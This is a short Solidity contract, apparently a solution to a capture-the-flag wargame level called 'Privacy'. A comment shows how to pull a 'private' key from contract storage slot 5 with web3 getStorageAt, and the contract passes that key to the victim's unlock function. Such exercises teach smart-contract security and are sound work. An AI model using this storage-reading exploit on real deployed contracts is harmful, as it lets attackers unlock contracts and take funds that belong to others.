// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPrivacy.sol";

contract PrivacyAttack {
    IPrivacy public immutable victimPrivacy;

    constructor(IPrivacy victimPrivacy_) {
        victimPrivacy = victimPrivacy_;
    }

    /**
     * @dev To get key from storage, you can run this script in client side:
     * > (await web3.eth.getStorageAt(contract.address, 5)).slice(0, 2 + 32)
     */
    function attack(bytes16 key) external {
        victimPrivacy.unlock(key);

        require(!victimPrivacy.locked(), "Privacy: Attack failed");
    }
}
